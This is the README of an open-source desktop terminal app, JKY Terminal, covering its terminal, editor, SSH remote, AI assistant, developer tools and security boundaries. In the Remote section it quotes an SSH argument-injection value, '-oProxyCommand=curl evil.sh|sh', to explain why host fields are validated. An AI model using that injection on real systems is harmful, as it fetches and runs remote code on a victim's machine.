# JKY Terminal

**AI Terminal. Infinite Possibilities.**

A real terminal, an AI assistant, a local-first dashboard, eleven developer
tools and a small arcade — one fast desktop app, on Linux, macOS and Windows.
Built by [@kartikeyajay2006](https://github.com/kartikeyajay2006). MIT.

[![CI](https://github.com/kartikeyajay2006/jky-terminal/actions/workflows/ci.yml/badge.svg)](https://github.com/kartikeyajay2006/jky-terminal/actions/workflows/ci.yml)
![Linux · macOS · Windows](https://img.shields.io/badge/platforms-Linux%20%C2%B7%20macOS%20%C2%B7%20Windows-00e5ff)
![Tests](https://img.shields.io/badge/tests-1813%20frontend%20%2B%20701%20Rust-3ddc97)
![License](https://img.shields.io/badge/license-MIT-7c3aed)

---

<p align="center">
  <img src="docs/img/sections.svg" alt="Six sections: Dashboard, Terminal, Assistant, Games, Apps, Developer" width="860">
</p>

---

## The one rule

<p align="center">
  <img src="docs/img/architecture.svg" alt="The window can ask. Only Rust can act." width="860">
</p>

The window has no ambient authority. Its CSP names no host but `'self'`, so a
compromised frontend has nowhere to send anything — every fetch, every secret,
every process is Rust's.

Three tests enforce it, and they read the source rather than trusting a
comment:

| Test | What it refuses |
|---|---|
| pinned command list | an IPC command nobody reviewed |
| no secret getter | any command that returns a key |
| `connect-src 'self'` | any host the window could reach |

---

## What is in it

| | Section | |
|---|---|---|
| ❯ | **Terminal** | A real pty, split any way you like. **Any command can become an app.** Scrollback survives a restart |
| ↺ | **History** | Every command you have ever run, searchable by half-remembered letters |
| ⇄ | **Remote** | A terminal on another machine, over the `ssh` you already have |
| ✎ | **Editor** | Files, inside the folders you opened and nowhere else |
| ▦ | **Workspaces** | What you are working on, saved under a name |
| ✦ | **Assistant** | Your key, in the OS keychain. Tools are gated; destructive ones need a click |
| ⌂ | **Dashboard** | Notes, todos, calendar, reminders. On disk, yours, arrangeable |
| ⌥ | **Developer** | Eleven tools. No account, no key |
| ⊞ | **Apps** | Eight, in tabs: GitHub, Gmail, Browser, Weather, News, Map, Timer, Calculator |
| ◈ | **Games** | Four, with scores kept |

Both boards — Apps and Developer — are the same grid, and **Edit layout** on
either lets you drag, resize, pin, hide, duplicate and group the tiles.
Nothing is lost by accident: removing a group keeps its contents, and even
delete is undone by Restore.

---

## Every command can become an app

A shell answers in text because a pipe is the only thing it can answer in. That
has nothing to do with what the answer *is*: `df` reports how full four disks
are, `docker ps` reports the state of five containers, and both are tables that
were flattened on the way out.

So the terminal reads the flattening back. Run a command; if its output has a
shape, a panel appears under it.

| Command | Becomes |
|---|---|
| `mkdir project` | the confirmation it never prints |
| `ls -l` | a listing with kinds, sizes and dates |
| `git status -s` | staged and unstaged, kept apart |
| `git log` | a timeline |
| `df -h` | bars, fullest disk first |
| `ps aux` | a process table |
| `docker ps` | containers, running and stopped |
| anything JSON | laid out |

**No model is involved.** These are parsers. A wrong table presented
confidently is worse than a wall of text, because text is at least honestly
text — so every recogniser refuses more than it accepts and shows nothing the
moment the output stops looking like what it expects.

Three rules make it safe to leave on:

- **It never replaces the output.** The text stays exactly where it was, and
  the panel can be dismissed. A terminal that swallowed what a command printed
  would be unusable the first time it got something wrong — and it will.
- **Actions type a command; nothing runs one.** A panel that could quietly
  `docker stop` would be one you had to trust. This one only has to be read:
  what it does is what you would have typed, and you still press Enter.
- **A pipe means it declines.** `docker ps | grep api` prints grep's output,
  and reading that as docker's would be confidently reading the wrong thing.

It is checked against two real shell sessions — `zsh -i` and `bash -i` driven
through a real pty, seven commands typed, everything recorded. Hand-written
fixtures test what you imagined the output looks like; those test what it is.
The first run found a `git log` line beginning with a stray keypad escape that
silently cost one commit in three.

---

## Splits

A tab is **one** terminal until you ask for another. Splitting is deliberate
and stays that way — nothing arrives split, and a layout comes back only
because you saved it in a workspace by name.

| | |
|---|---|
| `Ctrl+Shift+T` | split right — the shifted pair of `Ctrl+T`, which opens a whole terminal |
| `Ctrl+Shift+D` | split **d**own |
| `Ctrl+Shift+W` | close this pane |
| `Ctrl+Shift+←↑↓→` | move between panes |

Moving between panes is geometric, not structural: **right** means the pane
drawn to the right, which is not always the one the layout tree calls a
sibling. Split a tab right, then split the left half down, and *right* from
either left-hand pane reaches the same right-hand one — which is what the eye
expects and what a tree walk gets wrong.

Each pane keeps its own scrollback across a restart, and closing one forgets
only that one. Dividers are draggable, double-click to even them up, and
focusable — arrows resize, so a layout can be built without a mouse.

---

## Editor

CodeMirror 6, with the language loaded only when you open a file that needs
it. Ctrl/Cmd+S saves; an unsaved file shows a dot.

Folders are opened **in the editor**, not in Settings — choosing what to work
on is the work, and a round trip to a settings screen and back is not. Several
can be open at once, each with its own tree, and files from any of them open
side by side.

Closing a file with changes **asks**: Save, Discard, or Cancel. Three answers
because there are three things you might mean, and a two-button version makes
one of them unreachable. Escape and clicking away both mean Cancel, so a stray
keystroke never costs anything, and a save that fails leaves the file open —
closing it anyway would be discarding under another name.

**It can reach the folders you opened and nothing else.** Every path the window
sends is relative to one of them; it never names an absolute one. The boundary
has two halves and both are checked on every call: the root must be a folder
you actually opened, and the path must resolve inside it — checked *after*
canonicalising, so `../` and a symlink pointing out of the tree are refused by
the same rule rather than by a list of tricks somebody thought of. There is a
test for each. Folders are re-resolved per call, so one that was deleted or
unplugged stops working rather than answering for a ghost, and it is shown as
**missing** rather than quietly dropped.

Reads are text-only and size-capped. An editor that silently rewrote the bytes
it could not decode would corrupt the file on the next save, so a binary is
refused rather than mangled.

This is why the README used to say an editor was not here: Monaco is several
megabytes that ship whether or not anyone opens it. CodeMirror, loaded as its
own chunk with a chunk per language, adds **33 kB** to what everyone
downloads. And the budget that argument rested on is now enforced —
`pnpm run scan:bundle` fails the build if the entry bundle grows past it,
because a sentence in a README is a promise with nothing keeping it.

---

## Workspaces

A workspace is not a folder and not a window. It is the answer to *put me back
where I was on that project*: which folders the editor opens, where terminals
start and how many, and which machine, if any. Switching applies all of it at
once and lands you in it.

**Save what is open** makes one out of what you have already arranged, which is
how most of them get made — the arrangement exists, and naming it is the only
step left.

Switching **replaces** the open folders rather than adding to them. A workspace
is where you were, not where you were plus the last project. A folder it names
that is not there is reported and **kept**: a drive that is unplugged is a
folder that comes back, and quietly editing your workspace to remove it would
lose the setup you saved.

A workspace *names* things; it does not grant them. Opening its folders goes
through exactly the checks that opening one by hand does, so the file — which
is plain JSON you can edit — is a wish rather than a way to read the machine.
The same reasoning bounds how many terminals one can ask for: not a limit of
the terminal, a bound on what one click can do.

---

## Remote

A saved host opens a terminal on another machine. It runs the `ssh` your
computer already has, which is the whole design: your agent, your
`~/.ssh/config`, your `known_hosts` and your keys are the ones in use, so a
host that works in any other terminal works here.

**No password field, and no key field.** This app stores no SSH credential and
never sees one. An app that reimplemented SSH would be asking you to trust a
second, younger implementation of the thing standing between you and a
production machine.

The sharp edge is the argument list, and it is the reason `jky-remote` has a
file of its own with its own tests. `ssh` takes its options as arguments, so a
field that reaches the command line unchecked is not a string — it is an
option, and an address of `-oProxyCommand=curl evil.sh|sh` is a documented way
to turn *connect to this host* into *run this on my laptop*. Addresses, users,
key paths and jump hosts are all validated, refused rather than escaped, and
checked when you save as well as when you connect so the two can never
disagree. The destination goes after `--`.

The IPC command takes a host **id**, never a command line: nothing you type in
the window becomes a process argument.

Splitting a remote terminal gives you a local one — which is what you want
when you are looking at a server and need to check something here — and a
remote pane is not restored on the next launch, because bringing the app back
must not reconnect to somebody's production machine on its own.

---

## Completions

Start typing and what could come next appears. <kbd>↑</kbd><kbd>↓</kbd> or the
mouse choose one; <kbd>Tab</kbd>, <kbd>Enter</kbd> or a click puts it **on the
prompt**; <kbd>Enter</kbd> again runs it. <kbd>Esc</kbd> dismisses.

Two presses, not one. A completion that ran the moment you picked it would be
one you had to undo rather than read — and the same rule the command panels
follow: what happens is what you would have typed, and you still press Enter.
When the highlighted suggestion is already what is on the prompt there is
nothing to put there, so <kbd>Enter</kbd> goes to the shell and runs the
command instead of doing nothing.

What is offered depends on where the cursor is, so a branch is never offered
where a file belongs:

| Where | What |
|---|---|
| the first word | programs on your `PATH`, then whole lines you have run before |
| `git checkout ` | branches, read from `.git` rather than by running git |
| `git add ` | files, because that is what `git add` takes |
| `npm run ` | the scripts in `package.json`, with what each one runs |
| `cd ` | directories, never a file |
| `-` | that command's flags, with what each is for |
| anything else | paths |

**Nothing is run to find out what to offer.** Not the command being completed,
not `git`, not `--help`. A completion engine that executed something would
execute it on every keystroke, at a prompt where you have not decided yet.

**Nothing is guessed.** A command the app was not told about gets paths and
nothing else — no invented flags. A flag accepted with Tab is a flag nobody
re-reads before pressing Enter, so a wrong one is worse than none. And a
command your machine does not have is not described at all: offering
`docker ps` where docker is not installed is offering something that cannot
work.

The prompt is read off the screen rather than accumulated from keystrokes. A
model built from what you pressed goes wrong the first time you recall a line
with the up arrow — and goes wrong silently.

---

## History

Every command that finishes is recorded — what was typed, where it ran, and
how it ended. The shell reports all three through the same hook the command
panels use, so nothing is inferred from what is on screen.

Search is a **subsequence** match, because that is how people remember a
command: `dkrps` finds `docker ps`, and `gcm` finds `git commit -m`. Results
are ranked by how tightly the query matched, how often the command has been
run, and how recently — frequency damped by a logarithm, or an `ls` run five
hundred times would outrank whatever you were actually looking for.

A command appears once however many times it ran, with the count beside it.
Forty identical lines would bury everything else you have ever typed.

Choosing one **types it at the prompt**. It does not run it — the same rule
the command panels follow, and the reason you can browse this without being
careful. **Forget** removes every run of a command rather than the row you are
looking at: someone deleting a line with a credential in it means all of them.

This is not scrollback, and it is a different file. Scrollback is what a
command *printed* — emitted rather than authored, capped and rolling, kept per
terminal. This is what was *typed*: small, yours, and the thing worth finding
a month later.

---

## Every shortcut is yours

Settings → **Keyboard** lists all of them and takes a new binding by
listening: you choose a shortcut and press the keys you want. Typing
`Ctrl+Shift+D` into a box would mean agreeing with the app about how a chord
is spelled, and a mistake there is a shortcut that reads correctly and never
fires.

Two rules are enforced in Rust rather than in the panel, which is what makes
them true of a hand-edited `keymap.json` as well:

- **Every binding takes a modifier.** An unmodified key belongs to the shell,
  where every keystroke means something.
- **`Ctrl+C` and `Ctrl+D` cannot be taken.** Not a general reservation of
  shell keys — this app already claims `Ctrl+K` and `Ctrl+W`, and pretending
  otherwise would be theatre. These two are the pair that stop a terminal
  being a terminal: without interrupt a runaway command cannot be stopped,
  and without end-of-input a shell cannot be left.

`Ctrl` means Cmd on a Mac, stored as one modifier rather than two, so a keymap
made on a laptop means the same thing on a desktop. Only your changes are
written down — a default improved in a later release still reaches you.

---

## Developer tools

| | Tool | | | Tool |
|---|---|---|---|---|
| `{}` | **JSON** | | `⇄` | **HTTP** |
| `≡` | **YAML** | | `◫` | **System Monitor** |
| `±` | **Diff** | | `☰` | **Processes** |
| `#` | **Hash** | | `$` | **Environment** |
| `⊙` | **JWT** | | `◎` | **DNS** |
| `*` | **Regex** | | | |

Every one opens with what it is for, when you would reach for it, and worked
examples you can load. A test requires it, so a tool added later has to teach
itself too.

Four of them are defined by what they **refuse**:

- **JWT decodes and never verifies.** It has no key, so it must not imply a
  token is good — and `alg: none` is a real attack, where a decoder that
  implied validity would be at its most dangerous.
- **Environment cannot change a terminal already open.** Nothing outside a
  running process can, and "manage your environment variables" is the promise
  every tool like this makes and none keeps.
- **Ending a process says "asked it to stop".** A process may ignore the
  signal. It is the only thing here that changes the machine, so it asks
  first and goes in the audit log.
- **Regex runs in a worker so it can be killed.** `(a+)+$` against a run of
  a's takes longer than the universe, and a regular expression cannot be
  interrupted once started.

---

## Accounts

Two apps sign in, both through **your own browser**, never an embedded one.

| | How | What it can do |
|---|---|---|
| **GitHub** | device code, approved on github.com under your own 2FA | read repos, issues, PRs, notifications |
| **Gmail** | authorization code + PKCE, loopback redirect | read your inbox |

No token, code or verifier ever reaches the window. Gmail is `gmail.readonly`
and a test keeps `gmail.send` out; the list never fetches a message body, and
an opened one arrives as text — so nothing in a message can load an image and
report that you read it.

Google needs a client id of your own, and the panel walks you through it. None
ships, because a Google client belongs to whoever made it.

---

## Browser

Not an iframe — most of the web refuses to be one. Measured, not assumed:

| Site | Answer |
|---|---|
| GitHub, Jira | `X-Frame-Options: deny` |
| Gmail, Grafana | `DENY` |
| Slack, Notion, Figma, YouTube, Reddit | `SAMEORIGIN` |

So it is a **native child webview** drawn by whatever engine the OS ships —
WebKitGTK, WKWebView, WebView2. Nothing bundled. It cannot call a single Tauri
command, it keeps nothing, and it opens `http` and `https` only.

---

## Capture

A camera beside the bell photographs the whole window — rail, status bar, tabs
and whatever is open — and then asks what to do with it. **Save** writes
`jky-terminal-2026-09-09-014210.png` to your downloads folder and tells you
where it went. **Copy** puts it on the clipboard and leaves no file behind.

The picture is taken when you press the button and the choice is offered
afterwards, so the popover is never in the shot.

It is the same code on all three platforms, which took some deciding. Tauri has
no cross-platform way to photograph a webview, and the screen-capture crates
that fill that gap document window capture as unreliable on Wayland — the
default on current Fedora and Ubuntu. So the window renders a picture of
itself: the tree is serialised into an SVG `foreignObject`, drawn to a canvas,
and the live canvases are composited back on top, because a `<canvas>`
serialises as an empty element and the terminal would otherwise arrive as a
hole. Rust still performs every effect — it chooses the path and it owns the
clipboard — so the window is granted no filesystem capability by this feature,
and a test proves it.

The reasoning, and the measurements behind it, are in
[`docs/superpowers/specs/2026-09-09-capture-design.md`](docs/superpowers/specs/2026-09-09-capture-design.md).

One honest caveat: on Wayland a clipboard is served by a live process, so a
copied capture lasts as long as the app does. That is true of every Wayland
application, and a clipboard manager solves it.

---

## Themes and motion

Seven themes. A literal hex in a component is a lint error, and a test
computes the WCAG contrast of every theme's text against its own ground.

Nine things move — cursor, panels, spinners, progress, typing, a status pulse,
tabs, notifications, a game starting. `prefers-reduced-motion` is honoured by
**one** rule for the whole app, and a test pins that: a per-rule guard is one
somebody eventually forgets.

---

## Getting it

### From a release

Installers for Linux (`.deb`, `.rpm`, `.AppImage`), macOS (`.dmg`, both
architectures) and Windows (`.msi`, `.exe`) are attached to each
[release](https://github.com/kartikeyajay2006/jky-terminal/releases).

Builds are currently **unsigned**, so macOS and Windows warn on first launch.
[`docs/RELEASING.md`](docs/RELEASING.md) explains what turning signing on
requires.

### From source

```sh
# Linux needs the webview headers first
sudo dnf install webkit2gtk4.1-devel libsoup3-devel openssl-devel \
  curl wget file libappindicator-gtk3-devel librsvg2-devel
# or: sudo apt install libwebkit2gtk-4.1-dev libsoup-3.0-dev \
#       libjavascriptcoregtk-4.1-dev build-essential libssl-dev \
#       libayatana-appindicator3-dev librsvg2-dev

corepack enable
pnpm install
pnpm dev:desktop      # the real app
pnpm dev              # UI only, in a browser, no Rust rebuild
```

---

## Working on it

```sh
pnpm run verify                 # typecheck, lint, test, build, credential scan
cargo test --workspace          # Rust
cargo clippy --workspace --all-targets -- -D warnings
```

**Building a binary that runs on its own** needs the `custom-protocol` feature,
not just `--release`. Tauri decides dev-versus-production from that feature and
not from the build profile — `let dev = !custom_protocol` — so a plain
`cargo build --release` still points at the dev server and opens a blank
window:

```sh
pnpm --filter @jky/desktop build                              # the frontend
cargo build --release -p jky-terminal --features tauri/custom-protocol
```

`pnpm dev:desktop` needs a file watcher for each of Vite and the Tauri CLI. On
Linux that is an inotify instance apiece, and the default
`fs.inotify.max_user_instances` of 128 is easy to exhaust with a desktop shell
running — the symptom is `Too many open files`. `sysctl -w
fs.inotify.max_user_instances=512` fixes it.

```
jky-terminal/
├─ apps/desktop/
│  ├─ src/                    React 18 + TypeScript + Vite
│  │  ├─ app/                 shell, rail, tabs, theme, stores
│  │  ├─ features/
│  │  │  ├─ terminal/         xterm.js + WebGL, find, links, scrollback
│  │  │  ├─ assistant/        streaming chat, tool cards, sessions
│  │  │  ├─ dashboard/        notes, todos, calendar, reminders
│  │  │  ├─ notifications/    banners and the notification centre
│  │  │  ├─ games/            grid engine + four games
│  │  │  ├─ apps/             registry and the eight apps
│  │  │  ├─ developer/        registry and the eleven tools
│  │  │  ├─ palette/          Ctrl+K
│  │  │  └─ settings/         themes, keys, command catalogue
│  │  ├─ components/          the shared board, tabs, spinner
│  │  ├─ lib/                 tile layout and board session, as plain data
│  │  ├─ platform/            the adapter — tauri.ts and web.ts
│  │  └─ styles/              tokens and seven themes
│  └─ src-tauri/              thin #[tauri::command] wrappers only
└─ crates/
   ├─ jky-secrets/            SecretStore + OS keychain
   ├─ jky-pty/                portable-pty, launchers, command catalogue
   ├─ jky-ai/                 AIProvider, Anthropic, tool sandbox
   ├─ jky-store/              collections + capped scrollback
   ├─ jky-apps/               weather, news, places, routes, github, gmail, browser
   ├─ jky-tools/              hashing, diffing, YAML
   ├─ jky-system/             processor, memory, disks, processes, DNS
   ├─ jky-settings/           preferences
   ├─ jky-capture/            naming, saving and copying a screenshot
   └─ jky-audit/              local-only audit log
```

**Two rules worth knowing before changing anything.** All real logic lives in
`crates/`, so it is testable with `cargo test` without launching a window —
`src-tauri/src/commands/` holds only thin wrappers. And every native
capability is reached through `src/platform/`; a component that calls
`invoke()` directly is a lint error, because that boundary is what lets the
whole UI run and be tested in a browser.

### CI

Every push runs, on **Linux, macOS and Windows** with `fail-fast: false`:

| Job | What it proves |
|---|---|
| Frontend | typecheck, lint, 1813 tests |
| Native ×3 | `cargo test`, `clippy -D warnings`, and the shippable binary **links** |
| Dependency audit | `pnpm audit` and `cargo audit`, failing on high or critical |
| Security assertions | the command surface, the CSP, and no key in the bundle |

Compiling the library is not proof of portability. Linking the real binary is
where a platform-specific keychain backend actually fails.

---

## What is not here yet

Stated plainly, because a README that only lists what works is a sales page.

- **YouTube.** It needs Google OAuth like Gmail does, and Gmail now has the
  loopback sign-in that makes that possible — so this is a matter of building
  it rather than of not being able to. What is not planned is stripping ads:
  it violates YouTube's terms, and this app ships under a real name.
- **Sending mail.** The scope is `gmail.readonly` and a test keeps
  `gmail.send` and `gmail.modify` out of it, so this is enforced rather than
  promised. Reading your mail is a terminal being useful; sending it is a
  terminal with your signature, and that is a different decision.
- **Signing and auto-update.** The release pipeline works; certificates and an
  updater keypair do not exist yet. See [`docs/RELEASING.md`](docs/RELEASING.md).
- **Database tab.** v0.2.
- **Plugins.** v0.3.
- **Trending and Explore in the GitHub app.** GitHub publishes no API for
  either; every client that shows them scrapes the page. Left out rather than
  shipped as dead menu entries.

---

## Licence

MIT — see [LICENSE](LICENSE). The core stays free and open, always.
